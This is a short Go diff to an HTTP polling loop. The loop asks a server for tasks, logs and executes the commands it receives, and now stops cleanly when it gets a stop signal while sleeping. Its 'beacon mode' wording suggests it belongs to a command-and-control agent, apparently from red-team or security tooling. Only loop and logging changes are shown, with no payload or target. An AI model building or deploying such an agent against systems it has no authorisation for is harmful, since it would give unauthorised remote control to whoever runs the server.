@@ -46,13 +46,12 @@ func (a *Agent) runHttpLoop() error {
 			}
 
 			// Next, check if there is no task
+			// Note we need to continue the loop to disconnect if it's a beacon mode, sleep etc
 			if !taskResp.TaskAvailable {
 				log.Println("|AGENT LOOP HTTP|-> No task from server, going back to sleep.")
-
 			}
 
-			// Getting here implies there is a task, still not an issue to check explicitly (for readability)
-
+			// call executeTask if we do have a task
 			if taskResp.TaskAvailable {
 				log.Println("|AGENT LOOP HTTP|-> Task is available.")
 				log.Printf("|AGENT LOOP HTTP|-> Task received (ID: %s, Cmd: %s). Executing...", taskResp.TaskID, taskResp.Command)
@@ -69,9 +68,15 @@ func (a *Agent) runHttpLoop() error {
 
 			}
 			// ENDS HERE
-			
+
 			log.Printf("|AGENT LOOP HTTP|-> Sleeping for %v...", sleepDuration)
-			time.Sleep(sleepDuration)
+			select {
+			case <-time.After(sleepDuration):
+				// Continue loop
+			case <-a.stopChan:
+				log.Println("|AGENT LOOP HTTP|-> Stop signal received during sleep")
+				return nil
+			}
 		}
 	}
 }
